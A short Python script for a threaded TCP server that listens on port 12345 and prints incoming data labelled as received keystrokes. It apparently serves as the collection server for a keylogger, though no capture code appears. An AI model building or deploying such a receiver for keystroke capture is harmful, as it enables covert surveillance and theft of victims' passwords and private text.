import socket
import threading


# Function to handle client connections
def handle_client(client_socket):
    while True:
        # Receive data from the client
        keystroke = client_socket.recv(1024).decode('utf-8')
        if not keystroke:
            break
        print(f"Received keystroke: {keystroke}")
        # Here you can process the keystroke data as needed

    client_socket.close()


# Main function to run the server
def start_server():
    server_host = '0.0.0.0'  # Listen on all available interfaces
    server_port = 12345  # Choose a port number

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_host, server_port))
    server_socket.listen(5)  # Allow up to 5 connections

    print(f"[*] Listening on {server_host}:{server_port}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")

        # Start a new thread to handle the client
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()


# Start the server
if __name__ == '__main__':
    start_server()
